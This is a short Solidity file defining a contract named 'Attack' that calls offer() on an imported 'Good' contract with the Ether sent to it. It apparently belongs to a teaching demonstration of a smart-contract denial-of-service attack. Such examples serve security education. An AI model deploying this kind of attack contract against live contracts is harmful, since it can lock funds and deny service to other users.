//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Good.sol";

contract Attack {
    Good good;

    constructor(address _goodAddress){
        good = Good(_goodAddress);
    }

    function attack() public payable{
        good.offer{value:msg.value}();
    }
}